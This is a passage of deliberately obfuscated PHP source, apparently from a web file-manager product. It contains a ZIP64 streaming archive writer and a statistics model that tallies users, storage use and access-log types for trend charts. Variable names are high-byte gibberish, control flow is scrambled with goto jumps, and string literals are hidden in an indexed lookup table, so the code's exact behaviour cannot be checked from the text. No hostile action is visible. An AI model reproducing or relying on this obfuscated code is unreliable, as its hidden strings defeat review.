$A›´•¤Îñ°, $Dçƒ¨˜àˆĞ) { $this->files[] = array($e±ì‹ÕæğÒ, $DîÜŒ¤“Õ, $bğ·æÙ±Ó´, $cœÙÕ—Ø‹ì, $A›´•¤Îñ°, $this->ofs); $this->ofs += $Dçƒ¨˜àˆĞ; } protected function addCdrFile($Eªø‰‡³¦­) { goto Fœù”¯¯Ğò; b•ŒğªŠæ: $Eïî¬ƒÉ÷Ä = $this->packFields($aš‘²‹¹ÄÙ); $C„¨¥ìÉº = $this->packFields($fƒƒÏ÷Ñ‡§); $B‚¤”„•» = $Eïî¬ƒÉ÷Ä . $C˜‡‰î‡à . $DŞ±©ÛäÖƒ . $C„¨¥ìÉº; goto EÁİµç˜İ; EÁİµç˜İ: $this->send($B‚¤”„•»); $this->cdr_ofs += strlen($B‚¤”„•»); goto bŸèë¥¡† ; Fœù”¯¯Ğò: $eÀÎÆ°ÛÅ… =& $_SERVER[´Ù×Íå‘ÄõÛ]; list($C˜‡‰î‡à, $Aƒ¸×À˜, $CôÊ…¥èğ‰, $dÑŒÍ¬‘ÉÜ, $b©°·‰Œ²Ç, $DäÁ«÷’ÀÓ) = $Eªø‰‡³¦­; $DŞ±©ÛäÖƒ = $eÀÎÆ°ÛÅ…[33]; goto d²õÓÁµ×; d²õÓÁµ×: $b¬£¡„œ = $this->dosTime(time()); $aš‘²‹¹ÄÙ = array(array($eÀÎÆ°ÛÅ…[2020], static::CDR_FILE_SIGNATURE), array($eÀÎÆ°ÛÅ…[2021], static::ZIP_VERSION_64), array($eÀÎÆ°ÛÅ…[2021], static::ZIP_VERSION_64), array($eÀÎÆ°ÛÅ…[2021], 8), array($eÀÎÆ°ÛÅ…[2021], $Aƒ¸×À˜), array($eÀÎÆ°ÛÅ…[2020], $b¬£¡„œ), array($eÀÎÆ°ÛÅ…[2020], $CôÊ…¥èğ‰), array($eÀÎÆ°ÛÅ…[2020], 4294967295), array($eÀÎÆ°ÛÅ…[2020], 4294967295), array($eÀÎÆ°ÛÅ…[2021], strlen($C˜‡‰î‡à)), array($eÀÎÆ°ÛÅ…[2021], 32), array($eÀÎÆ°ÛÅ…[2021], strlen($DŞ±©ÛäÖƒ)), array($eÀÎÆ°ÛÅ…[2021], 0), array($eÀÎÆ°ÛÅ…[2021], 0), array($eÀÎÆ°ÛÅ…[2020], 32), array($eÀÎÆ°ÛÅ…[2020], 4294967295)); $fƒƒÏ÷Ñ‡§ = array(array($eÀÎÆ°ÛÅ…[2021], 1), array($eÀÎÆ°ÛÅ…[2021], 28), array($eÀÎÆ°ÛÅ…[2022], $b©°·‰Œ²Ç), array($eÀÎÆ°ÛÅ…[2022], $dÑŒÍ¬‘ÉÜ), array($eÀÎÆ°ÛÅ…[2022], $DäÁ«÷’ÀÓ), array($eÀÎÆ°ÛÅ…[2020], 0)); goto b•ŒğªŠæ; bŸèë¥¡† : } protected function addCdr64Eof() { goto eĞ‚Æ’‡í¢; eĞ‚Æ’‡í¢: $E¬Â”‚ê¬Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f‹í‚çÊ¥Û = count($this->files); $b«áÏ›Ä = $this->cdr_ofs; goto e‡ßï†Ö; c´™…Ÿëå¤: $this->send($C´Ü‰ºÍæ); goto Aî½×Œ¡—; e‡ßï†Ö: $Fî©î¢¦‘ = $this->ofs; $DÄö„ŒàÌš = array(array($E¬Â”‚ê¬Ú[2020], static::ZIP64_CDR_EOF_SIGNATURE), array($E¬Â”‚ê¬Ú[2022], 44), array($E¬Â”‚ê¬Ú[2021], static::ZIP_VERSION_64), array($E¬Â”‚ê¬Ú[2021], static::ZIP_VERSION_64), array($E¬Â”‚ê¬Ú[2020], 0), array($E¬Â”‚ê¬Ú[2020], 0), array($E¬Â”‚ê¬Ú[2022], $f‹í‚çÊ¥Û), array($E¬Â”‚ê¬Ú[2022], $f‹í‚çÊ¥Û), array($E¬Â”‚ê¬Ú[2022], $b«áÏ›Ä), array($E¬Â”‚ê¬Ú[2022], $Fî©î¢¦‘)); $C´Ü‰ºÍæ = $this->packFields($DÄö„ŒàÌš); goto c´™…Ÿëå¤; Aî½×Œ¡—: } protected function addCdr64Locator() { goto D£ÃÈÄÅÅ; aÈ¤Ğ¥Æ„æ: $B³¤£™ˆ¦× = $this->ofs; $aÉ°µïš‚ = array(array($eê‚áé˜Š[2020], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($eê‚áé˜Š[2020], 0), array($eê‚áé˜Š[2022], $B³¤£™ˆ¦× + $Cö°Ü¯ ª‰), array($eê‚áé˜Š[2020], 1)); $e‡äÛ÷ó¶º = $this->packFields($aÉ°µïš‚); goto f“ÈÖÖô¦Ü; D£ÃÈÄÅÅ: $eê‚áé˜Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cò†İğó– = count($this->files); $Cö°Ü¯ ª‰ = $this->cdr_ofs; goto aÈ¤Ğ¥Æ„æ; f“ÈÖÖô¦Ü: $this->send($e‡äÛ÷ó¶º); goto dÄÈçïˆ‡¬; dÄÈçïˆ‡¬: } protected function addCdrEof() { goto aÁØ…»¤³; Bê™¡ä˜ÅÌ: $D“ùšÊİò« = $this->ofs; $E–†á…ƒÂÁ = $CÆÎùÉ“‰±[33]; $BÛ±§Ïâº = array(array($CÆÎùÉ“‰±[2020], static::CDR_EOF_SIGNATURE), array($CÆÎùÉ“‰±[2021], 0), array($CÆÎùÉ“‰±[2021], 0), array($CÆÎùÉ“‰±[2021], $Dè–öÀÁÇ), array($CÆÎùÉ“‰±[2021], $Dè–öÀÁÇ), array($CÆÎùÉ“‰±[2020], 4294967295), array($CÆÎùÉ“‰±[2020], 4294967295), array($CÆÎùÉ“‰±[2021], strlen($E–†á…ƒÂÁ))); goto BÛ”ŠœÔÂÍ; BÛ”ŠœÔÂÍ: $DáÚ¡½ğ÷Ë = $this->packFields($BÛ±§Ïâº) . $E–†á…ƒÂÁ; $this->send($DáÚ¡½ğ÷Ë); goto b²Œóã¡¡«; aÁØ…»¤³: $CÆÎùÉ“‰± =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dè–öÀÁÇ = count($this->files); $FåÀÈ»Æ·‰ = $this->cdr_ofs; goto Bê™¡ä˜ÅÌ; b²Œóã¡¡«: } protected function addCdr() { foreach ($this->files as $C—‡·óËƒ·) { $this->addCdrFile($C—‡·óËƒ·); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $câº¿Ä½Ò° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B£šÌ™º‘ó = $câº¿Ä½Ò°[202]; if ($this->outputName) { $E‡¦È„Ú = trim(str_replace(array($câº¿Ä½Ò°[113], $câº¿Ä½Ò°[55], $câº¿Ä½Ò°[93], $câº¿Ä½Ò°[67], $câº¿Ä½Ò°[217], $câº¿Ä½Ò°[996]), $câº¿Ä½Ò°[33], $this->outputName)); $C•†´ºë¯¹ = rawurlencode($E‡¦È„Ú); $B£šÌ™º‘ó .= "\x3b\40\x66\x69\x6c\145\156\141\x6d\x65\52\75\165\x74\146\x2d\70\47\47{$C•†´ºë¯¹}"; } $B¼øîŸè¹ã = array($câº¿Ä½Ò°[199] => $câº¿Ä½Ò°[2023], $câº¿Ä½Ò°[2024] => $B£šÌ™º‘ó, $câº¿Ä½Ò°[2025] => $câº¿Ä½Ò°[2026], $câº¿Ä½Ò°[2027] => $câº¿Ä½Ò°[2028], $câº¿Ä½Ò°[2029] => $câº¿Ä½Ò°[2030]); foreach ($B¼øîŸè¹ã as $AĞŸ§¹¼Š => $eóè ”Â”) { header($AĞŸ§¹¼Š . $câº¿Ä½Ò°[883] . $eóè ”Â”); } } protected function send($dîœ¯¡¼ø) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $dîœ¯¡¼ø); } protected final function dosTime($c¼ˆÜñì…§) { $C–ÜØ·˜é­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÂ‡Ğá‰® = getdate($c¼ˆÜñì…§); if ($dÂ‡Ğá‰®[$C–ÜØ·˜é­[1730]] < 1980) { $dÂ‡Ğá‰® = array($C–ÜØ·˜é­[1730] => 1980, $C–ÜØ·˜é­[2031] => 1, $C–ÜØ·˜é­[2032] => 1, $C–ÜØ·˜é­[2033] => 0, $C–ÜØ·˜é­[2034] => 0, $C–ÜØ·˜é­[2035] => 0); } $dÂ‡Ğá‰®[$C–ÜØ·˜é­[1730]] -= 1980; return $dÂ‡Ğá‰®[$C–ÜØ·˜é­[1730]] << 25 | $dÂ‡Ğá‰®[$C–ÜØ·˜é­[2031]] << 21 | $dÂ‡Ğá‰®[$C–ÜØ·˜é­[2032]] << 16 | $dÂ‡Ğá‰®[$C–ÜØ·˜é­[2033]] << 11 | $dÂ‡Ğá‰®[$C–ÜØ·˜é­[2034]] << 5 | $dÂ‡Ğá‰®[$C–ÜØ·˜é­[2035]] >> 1; } protected function packFields($eŒà¿é±î) { $A¾»›ÙéÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cË•³œ¤µù = $A¾»›ÙéÙ[33]; $Fºß§†½ = array(); foreach ($eŒà¿é±î as $D×ÊÄÀğ÷¼) { $cË•³œ¤µù .= $D×ÊÄÀğ÷¼[0]; $Fºß§†½[] = $D×ÊÄÀğ÷¼[1]; } array_unshift($Fºß§†½, $cË•³œ¤µù); return call_user_func_array($A¾»›ÙéÙ[2036], $Fºß§†½); } protected function filterFilename($bÉŒ÷Õâ°í) { $D¥÷Ğ¥àÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return str_replace(array($D¥÷Ğ¥àÒ[93], $D¥÷Ğ¥àÒ[4], $D¥÷Ğ¥àÒ[176], $D¥÷Ğ¥àÒ[69], $D¥÷Ğ¥àÒ[113], $D¥÷Ğ¥àÒ[928], $D¥÷Ğ¥àÒ[931], $D¥÷Ğ¥àÒ[271]), $D¥÷Ğ¥àÒ[70], $bÉŒ÷Õâ°í); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($F‚Šš¨œ‡) { $bØ‡œ‰ÁİÊ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÅÃ–­šå¬ = array($bØ‡œ‰ÁİÊ[537] => array($bØ‡œ‰ÁİÊ[29] => $bØ‡œ‰ÁİÊ[2037], $bØ‡œ‰ÁİÊ[261] => array($bØ‡œ‰ÁİÊ[210], $bØ‡œ‰ÁİÊ[701], $bØ‡œ‰ÁİÊ[2038], $bØ‡œ‰ÁİÊ[2039])), $bØ‡œ‰ÁİÊ[2040] => array($bØ‡œ‰ÁİÊ[29] => $bØ‡œ‰ÁİÊ[2041], $bØ‡œ‰ÁİÊ[261] => array($bØ‡œ‰ÁİÊ[210], $bØ‡œ‰ÁİÊ[699], $bØ‡œ‰ÁİÊ[2042], $bØ‡œ‰ÁİÊ[2043], $bØ‡œ‰ÁİÊ[2044]))); if (!isset($CÅÃ–­šå¬[$F‚Šš¨œ‡])) { return !1; } $this->optionType = $CÅÃ–­šå¬[$F‚Šš¨œ‡][$bØ‡œ‰ÁİÊ[29]]; $this->field = $CÅÃ–­šå¬[$F‚Šš¨œ‡][$bØ‡œ‰ÁİÊ[261]]; return !0; } public function listData($E¢‡¢–÷®õ = false, $DÅéŸÄ÷…ó = "\x6d\x6f\x64\x69\146\171\124\x69\155\x65", $E‰’®„Éß‰ = false) { return parent::listData($E¢‡¢–÷®õ, $DÅéŸÄ÷…ó, $E‰’®„Éß‰); } public function trendList($fµëàä¤Œ¤) { goto aõùñØæ…“; AÚ³ÓÕáõÃ: foreach ($dºŸóÍï as $CÌó„ËĞÄ’) { $this->{$b“Ó²ŸÅî}($CÌó„ËĞÄ’); } return $this->listData(); goto AƒœÃàÆçß; aõùñØæ…“: $bİ‡à×®‰– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e³ËÓ¦Ö™§ = $this->listData(); if ($e³ËÓ¦Ö™§) { $F×ßÃÁ¶á = end($e³ËÓ¦Ö™§); $CÌó„ËĞÄ’ = date($bİ‡à×®‰–[2045], strtotime($bİ‡à×®‰–[2046])); if ($F×ßÃÁ¶á[$bİ‡à×®‰–[210]] == $CÌó„ËĞÄ’) { return $e³ËÓ¦Ö™§; } $aÛÕ•‰ë´’ = strtotime($F×ßÃÁ¶á[$bİ‡à×®‰–[210]]); } goto BëÇ¹–±ç; BëÇ¹–±ç: if (!isset($aÛÕ•‰ë´’)) { $CâøÎ±…÷ˆ = $fµëàä¤Œ¤ == $bİ‡à×®‰–[537] ? $bİ‡à×®‰–[479] : $bİ‡à×®‰–[753]; $aÛÕ•‰ë´’ = Model($CâøÎ±…÷ˆ)->min($bİ‡à×®‰–[187]); } $b“Ó²ŸÅî = $bİ‡à×®‰–[2047] . ucfirst($fµëàä¤Œ¤); $dºŸóÍï = $this->dateList($aÛÕ•‰ë´’); goto AÚ³ÓÕáõÃ; AƒœÃàÆçß: } private function dateList($dŠÉê”éª) { $eÜ‘ÉğøŠ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F‡ÊŒéÑ‚¥ = $dŠÉê”éª; $C§‡¢Äšà = strtotime($eÜ‘ÉğøŠ‚[2046]); $bŠİ³Ì”†¿ = array(); while ($F‡ÊŒéÑ‚¥ <= $C§‡¢Äšà) { $bŠİ³Ì”†¿[] = date($eÜ‘ÉğøŠ‚[2045], $F‡ÊŒéÑ‚¥); $F‡ÊŒéÑ‚¥ = strtotime($eÜ‘ÉğøŠ‚[2048], $F‡ÊŒéÑ‚¥); } return $bŠİ³Ì”†¿; } public function _recordUser($Aä²ì¢ŞàĞ = '') { goto Dë°½ŒÈí·; fËòµ§Ç: $F…è¬Œ¨â¼ = array($aò„ÙÇœ¾¡[210] => $Aä²ì¢ŞàĞ, $aò„ÙÇœ¾¡[701] => (int) $aƒ¡“«¥Ø, $aò„ÙÇœ¾¡[2038] => (int) $aëïïÏÆãô, $aò„ÙÇœ¾¡[2039] => (int) $Añ¾–ÃÎƒ); return $this->insert($F…è¬Œ¨â¼); goto Añ”®ÛÚ›å; fá®ÑÖò©: $aëïïÏÆãô = Model($aò„ÙÇœ¾¡[479])->where($D¦¾Öñ¹Á)->count($aò„ÙÇœ¾¡[1441]); $D¦¾Öñ¹Á[$aò„ÙÇœ¾¡[29]] = $aò„ÙÇœ¾¡[2051]; $Añ¾–ÃÎƒ = Model($aò„ÙÇœ¾¡[2052])->where($D¦¾Öñ¹Á)->count($aò„ÙÇœ¾¡[2053]); goto fËòµ§Ç; DÛ¼¹Š…: $D¦¾Öñ¹Á = array($aò„ÙÇœ¾¡[187] => array($aò„ÙÇœ¾¡[930], $D…‰¹Õ·ï)); $aƒ¡“«¥Ø = Model($aò„ÙÇœ¾¡[479])->where($D¦¾Öñ¹Á)->count($aò„ÙÇœ¾¡[1441]); $D¦¾Öñ¹Á[$aò„ÙÇœ¾¡[187]] = array($aò„ÙÇœ¾¡[321], array($bğáÊ¨õêí, $D…‰¹Õ·ï)); goto fá®ÑÖò©; Dë°½ŒÈí·: $aò„ÙÇœ¾¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bğáÊ¨õêí = strtotime(date($aò„ÙÇœ¾¡[2049], strtotime($Aä²ì¢ŞàĞ))); $D…‰¹Õ·ï = strtotime(date($aò„ÙÇœ¾¡[2050], strtotime($Aä²ì¢ŞàĞ))); goto DÛ¼¹Š…; Añ”®ÛÚ›å: } public function _recordStore($eöÌ¿°º¬š = '') { goto D‹³À¶„»Ê; b…ˆ¿Ö‡·ñ: $B¾£Ä¹„£ = Model($dòøÏÃ¤¦[422])->where($bÚØ Æ)->sum($dòøÏÃ¤¦[77]); $bÚØ Æ[$dòøÏÃ¤¦[370]] = 0; $fËÚÙìÉÕù = Model($dòøÏÃ¤¦[753])->where($bÚØ Æ)->sum($dòøÏÃ¤¦[77]); goto bšÄ Ôæ¹; D‹³À¶„»Ê: $dòøÏÃ¤¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A÷•¿ï¢­ = strtotime(date($dòøÏÃ¤¦[2050], strtotime($eöÌ¿°º¬š))); $bÚØ Æ = array($dòøÏÃ¤¦[187] => array($dòøÏÃ¤¦[930], $A÷•¿ï¢­)); goto b…ˆ¿Ö‡·ñ; bšÄ Ôæ¹: $bÚØ Æ[$dòøÏÃ¤¦[371]] = 1; $b®‹‘Ş¢ñî = Model($dòøÏÃ¤¦[753])->where($bÚØ Æ)->sum($dòøÏÃ¤¦[77]); $bÚØ Æ[$dòøÏÃ¤¦[371]] = 2; goto A°Ã«Áİ¡; A°Ã«Áİ¡: $FÑó¦Æ×ãÂ = Model($dòøÏÃ¤¦[753])->where($bÚØ Æ)->sum($dòøÏÃ¤¦[77]); $bµÛ¤†µ¥Ä = array($dòøÏÃ¤¦[210] => $eöÌ¿°º¬š, $dòøÏÃ¤¦[699] => (int) $fËÚÙìÉÕù, $dòøÏÃ¤¦[2042] => (int) $B¾£Ä¹„£, $dòøÏÃ¤¦[2043] => (int) $b®‹‘Ş¢ñî, $dòøÏÃ¤¦[2044] => (int) $FÑó¦Æ×ãÂ); return $this->insert($bµÛ¤†µ¥Ä); goto c·Âè÷É³Î; c·Âè÷É³Î: } public function trend($BâÙ¸æÓÚâ, $AÒ¨…Ëóš«) { goto eß™“‘Š; eß™“‘Š: $d²Æ†Ê²Í† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->init($BâÙ¸æÓÚâ)) { return !1; } $d†©¿¢×ùä = $this->trendList($BâÙ¸æÓÚâ); goto eóáÀ‚—¸å; eóáÀ‚—¸å: if ($d†©¿¢×ùä && $AÒ¨…Ëóš« != $d²Æ†Ê²Í†[1416]) { $D›ç—–à…í = $d†©¿¢×ùä[0][$d²Æ†Ê²Í†[210]]; $aèÒ†·† = $this->validDate($AÒ¨…Ëóš«, $D›ç—–à…í); $BéíÓòãŠ£ = array(); $eÇˆÌ‘Å­‘ = array_to_keyvalue($d†©¿¢×ùä, $d²Æ†Ê²Í†[210]); foreach ($aèÒ†·† as $EÒ° ©¹¯ß) { if (isset($eÇˆÌ‘Å­‘[$EÒ° ©¹¯ß])) { $Fª·ìá¡¦ = $eÇˆÌ‘Å­‘[$EÒ° ©¹¯ß]; } else { $Fª·ìá¡¦ = end($d†©¿¢×ùä); $Fª·ìá¡¦[$d²Æ†Ê²Í†[210]] = $EÒ° ©¹¯ß; if ($BâÙ¸æÓÚâ == $d²Æ†Ê²Í†[537]) { $Fª·ìá¡¦[$d²Æ†Ê²Í†[2038]] = $Fª·ìá¡¦[$d²Æ†Ê²Í†[2039]] = 0; } } $BéíÓòãŠ£[] = $Fª·ìá¡¦; } $d†©¿¢×ùä = $BéíÓòãŠ£; } $A„î˜¤ïÂè = array($d²Æ†Ê²Í†[537] => array($d²Æ†Ê²Í†[701] => LNG($d²Æ†Ê²Í†[2054]), $d²Æ†Ê²Í†[2038] => LNG($d²Æ†Ê²Í†[2055]), $d²Æ†Ê²Í†[2039] => LNG($d²Æ†Ê²Í†[2056])), $d²Æ†Ê²Í†[2040] => array($d²Æ†Ê²Í†[699] => LNG($d²Æ†Ê²Í†[2057]), $d²Æ†Ê²Í†[2042] => LNG($d²Æ†Ê²Í†[2058]), $d²Æ†Ê²Í†[2043] => LNG($d²Æ†Ê²Í†[2059]), $d²Æ†Ê²Í†[2044] => LNG($d²Æ†Ê²Í†[2060]))); $Cêµí‘çâÅ = array($d²Æ†Ê²Í†[537] => $d²Æ†Ê²Í†[2061], $d²Æ†Ê²Í†[2040] => $d²Æ†Ê²Í†[77]); goto Eôò…îÖê; b›ôÜƒÑ•: return $fîŠ™Éğ‚; goto eº›™ö¤¸Æ; Eôò…îÖê: if (empty($d†©¿¢×ùä)) { $EÒ° ©¹¯ß = date($d²Æ†Ê²Í†[2045], strtotime($d²Æ†Ê²Í†[2046])); $BÂ£ä¤øÒƒ = array($d²Æ†Ê²Í†[210] => $EÒ° ©¹¯ß); foreach ($A„î˜¤ïÂè[$BâÙ¸æÓÚâ] as $AŞÚŠäŞ => $d··ŸŞ Šã) { $BÂ£ä¤øÒƒ[$AŞÚŠäŞ] = 0; } $d†©¿¢×ùä[] = $BÂ£ä¤øÒƒ; } $fîŠ™Éğ‚ = array(); foreach ($d†©¿¢×ùä as $d··ŸŞ Šã) { if ($BâÙ¸æÓÚâ == $d²Æ†Ê²Í†[2040] && $d··ŸŞ Šã[$d²Æ†Ê²Í†[2042]] > $d··ŸŞ Šã[$d²Æ†Ê²Í†[699]]) { $d··ŸŞ Šã[$d²Æ†Ê²Í†[2042]] = $d··ŸŞ Šã[$d²Æ†Ê²Í†[699]]; } foreach ($A„î˜¤ïÂè[$BâÙ¸æÓÚâ] as $AŞÚŠäŞ => $Dææ…Æõ×Æ) { $Fª·ìá¡¦ = array($d²Æ†Ê²Í†[210] => $d··ŸŞ Šã[$d²Æ†Ê²Í†[210]], $d²Æ†Ê²Í†[1347] => $Dææ…Æõ×Æ); $Fª·ìá¡¦[$Cêµí‘çâÅ[$BâÙ¸æÓÚâ]] = isset($d··ŸŞ Šã[$AŞÚŠäŞ]) ? $d··ŸŞ Šã[$AŞÚŠäŞ] : 0; $fîŠ™Éğ‚[] = $Fª·ìá¡¦; } } goto b›ôÜƒÑ•; eº›™ö¤¸Æ: } public function validDate($f¬ç†¡Û¨, $C¸„‹ĞÅ±) { goto f°óîÃéƒ; a†ô¶÷¹œ: switch ($f¬ç†¡Û¨) { case $C¶êâ¿Ï´ê[1423]: $A•íÒŸœÙÎ = mktime(0, 0, 0, date($C¶êâ¿Ï´ê[2062]), date($C¶êâ¿Ï´ê[2063]) - date($C¶êâ¿Ï´ê[1230]) + 7 - 7, date($C¶êâ¿Ï´ê[2064])); $e¸ ğ‰óÌ” = 0; do { $b»¨Š£ƒ«¾ = date($C¶êâ¿Ï´ê[2045], $A•íÒŸœÙÎ - 3600 * 24 * 7 * $e¸ ğ‰óÌ”); $C¡ÉòÈïÃ[] = $b»¨Š£ƒ«¾; $e¸ ğ‰óÌ”++; } while ($C¸„‹ĞÅ± < $b»¨Š£ƒ«¾); break; case $C¶êâ¿Ï´ê[1421]: $e¸ ğ‰óÌ” = 1; do { $c»‡°ª”¡™ = date($C¶êâ¿Ï´ê[2065], strtotime("\55\x20{$e¸ ğ‰óÌ”}\x20\155\x6f\156\x74\150\163")); $C¡ÉòÈïÃ[] = $c»‡°ª”¡™; $e¸ ğ‰óÌ”++; } while ($C¸„‹ĞÅ± < $c»‡°ª”¡™); break; case $C¶êâ¿Ï´ê[1730]: $DÍ–˜Ùñ­Ù = (int) date($C¶êâ¿Ï´ê[2064], strtotime($C¸„‹ĞÅ±)); $c±„°§å£ = (int) date($C¶êâ¿Ï´ê[2064]); if ($DÍ–˜Ùñ­Ù >= $c±„°§å£) { break; } for ($DÍ–˜Ùñ­Ù; $DÍ–˜Ùñ­Ù < $c±„°§å£; $DÍ–˜Ùñ­Ù++) { $C¡ÉòÈïÃ[] = $DÍ–˜Ùñ­Ù . $C¶êâ¿Ï´ê[2066]; } break; default: break; } if ($C¸„‹ĞÅ± > end($C¡ÉòÈïÃ)) { array_pop($C¡ÉòÈïÃ); } sort($C¡ÉòÈïÃ); goto BÊ£ó™ÉÜŒ; f°óîÃéƒ: $C¶êâ¿Ï´ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a“ÓĞºàÛ‘ = date($C¶êâ¿Ï´ê[2045], strtotime($C¶êâ¿Ï´ê[2046])); $C¡ÉòÈïÃ = array($a“ÓĞºàÛ‘); goto a†ô¶÷¹œ; BÊ£ó™ÉÜŒ: return $C¡ÉòÈïÃ; goto A¹·¹•¼Ã“; A¹·¹•¼Ã“: } public function listTable($D‘áÛˆøÁ) { $Eæ÷ËñöÂÂ = ucfirst($D‘áÛˆøÁ); return Model($Eæ÷ËñöÂÂ)->listData(); } public function option($fÅèßÊçï) { $CÖ»ÜğÍÚÀ = $_SERVER[´Ù×Íå‘ÄõÛ][2067] . ucfirst($fÅèßÊçï); return $this->{$CÖ»ÜğÍÚÀ}(); } private function optionUser() { goto d™§—¹óŠÖ; b‘š÷­‘ê: if (!$AËÄ ¿Ÿ‰ø) { $AËÄ ¿Ÿ‰ø = 1; } $eÙÄ‡„¿†î = strtotime(date($Føƒ‚Ëñˆ›[2049])); $AØŞºÉ‹£Õ = array($Føƒ‚Ëñˆ›[2070] => array($Føƒ‚Ëñˆ›[931], $eÙÄ‡„¿†î)); goto aÜÑ©®Ô†–; aÜÑ©®Ô†–: $A“çœêÛã³ = Model($Føƒ‚Ëñˆ›[479])->where($AØŞºÉ‹£Õ)->count($Føƒ‚Ëñˆ›[1441]); return array($Føƒ‚Ëñˆ›[696] => (int) $dÙÁˆôîˆ‘, $Føƒ‚Ëñˆ›[2071] => (int) ($dÙÁˆôîˆ‘ - $E±Ÿ¶·´­), $Føƒ‚Ëñˆ›[2072] => (int) $E±Ÿ¶·´­, $Føƒ‚Ëñˆ›[2073] => (int) $A“çœêÛã³, $Føƒ‚Ëñˆ›[2074] => $AËÄ ¿Ÿ‰ø); goto e–ƒğÌìÖ; d™§—¹óŠÖ: $Føƒ‚Ëñˆ› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÙÁˆôîˆ‘ = Model($Føƒ‚Ëñˆ›[479])->count($Føƒ‚Ëñˆ›[1441]); $E±Ÿ¶·´­ = Model($Føƒ‚Ëñˆ›[479])->where($Føƒ‚Ëñˆ›[2068])->count($Føƒ‚Ëñˆ›[1441]); goto E„–‰Ëô; E„–‰Ëô: $eÙÄ‡„¿†î = strtotime($Føƒ‚Ëñˆ›[2069]); $AØŞºÉ‹£Õ = array($Føƒ‚Ëñˆ›[2070] => array($Føƒ‚Ëñˆ›[931], $eÙÄ‡„¿†î)); $AËÄ ¿Ÿ‰ø = (int) Model($Føƒ‚Ëñˆ›[479])->where($AØŞºÉ‹£Õ)->count($Føƒ‚Ëñˆ›[1441]); goto b‘š÷­‘ê; e–ƒğÌìÖ: } private function optionFile() { goto cß¢Šà§œ¨; cß¢Šà§œ¨: $Dá¶œèâè =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÊÎ¾‰ö•Œ = $this->sourceSize(); $câîƒÕ¦À = $fÊÎ¾‰ö•Œ[$Dá¶œèâè[77]]; goto A±‘ãç¬ß; A²ğÇÔ¼âö: $F“ôßÓ¨èÄ = Model($Dá¶œèâè[753])->where($fö«ö°¹®)->sum($Dá¶œèâè[77]); $c‹„ŒÂ£Ìª = Model($Dá¶œèâè[753])->where($fö«ö°¹®)->count($Dá¶œèâè[369]); return array($Dá¶œèâè[699] => $câîƒÕ¦À, $Dá¶œèâè[2042] => $b–·…¢†Ú, $Dá¶œèâè[2075] => $câîƒÕ¦À - $b–·…¢†Ú, $Dá¶œèâè[2076] => (int) $F“ôßÓ¨èÄ, $Dá¶œèâè[701] => (int) $eîËÎ…¹‘İ, $Dá¶œèâè[2077] => (int) $c‹„ŒÂ£Ìª); goto D——»œ¥†; A±‘ãç¬ß: $b–·…¢†Ú = $fÊÎ¾‰ö•Œ[$Dá¶œèâè[2042]]; $eîËÎ…¹‘İ = Model($Dá¶œèâè[753])->where(array($Dá¶œèâè[370] => 0))->count($Dá¶œèâè[369]); $fö«ö°¹® = array($Dá¶œèâè[370] => 0, $Dá¶œèâè[187] => array($Dá¶œèâè[931], strtotime(date($Dá¶œèâè[2049])))); goto A²ğÇÔ¼âö; D——»œ¥†: } private function optionAccess() { $fòå£À¥¿« =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($fòå£À¥¿«[696] => $this->typeLogCnt(), $fòå£À¥¿«[103] => $this->typeLogCnt($fòå£À¥¿«[103]), $fòå£À¥¿«[404] => $this->typeLogCnt($fòå£À¥¿«[404]), $fòå£À¥¿«[2078] => $this->typeLogCnt($fòå£À¥¿«[2078]), $fòå£À¥¿«[2079] => $this->typeLogCnt($fòå£À¥¿«[2079]), $fòå£À¥¿«[537] => $this->typeLogCnt($fòå£À¥¿«[33], $fòå£À¥¿«[2053])); } private function typeLogCnt($fíÄá×À¤‹ = '', $CòâÍ¾µë¾ = "\151\x64") { goto FÚÆ¨¸„“œ; FÚÆ¨¸„“œ: $C†¥÷à‡å’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A…¯œ•Ì‚Š = array($C†¥÷à‡å’[103] => array($C†¥÷à‡å’[2080], $C†¥÷à‡å’[2081]), $C†¥÷à‡å’[404] => array($C†¥÷à‡å’[2082], $C†¥÷à‡å’[2083]), $C†¥÷à‡å’[2078] => array($C†¥÷à‡å’[2084], $C†¥÷à‡å’[2085], $C†¥÷à‡å’[2086]), $C†¥÷à‡å’[2079] => array($C†¥÷à‡å’[2087], $C†¥÷à‡å’[2088]), $C†¥÷à‡å’[2089] => array($C†¥÷à‡å’[2090], $C†¥÷à‡å’[2091], $C†¥÷à‡å’[2092])); $bŒ•‘ª•² = strtotime(date($C†¥÷à‡å’[2049])); goto DŞ‚Ş«†Òì; có¬òŞíó•: return (int) $dÍ‰òîÍÁ; goto eïêŠè¯„; DŞ‚Ş«†Òì: $A¶ÇµÕ…¤ñ = array($C†¥÷à‡å’[187] => array($C†¥÷à‡å’[931], $bŒ•‘ª•²)); if ($fíÄá×À¤‹) { $A¶ÇµÕ…¤ñ[$C†¥÷à‡å’[29]] = array($C†¥÷à‡å’[7], $A…¯œ•Ì‚Š[$fíÄá×À¤‹]); } $dÍ‰òîÍÁ = Model($C†¥÷à‡å’[2052])->where($A¶ÇµÕ…¤ñ)->count($CòâÍ¾µë¾); goto có¬òŞíó•; eïêŠè¯„: } private function optionServer() { goto d‚âÌœì´‹; d‚âÌœì´‹: $FÎ¡æœ‚œ‰ =& 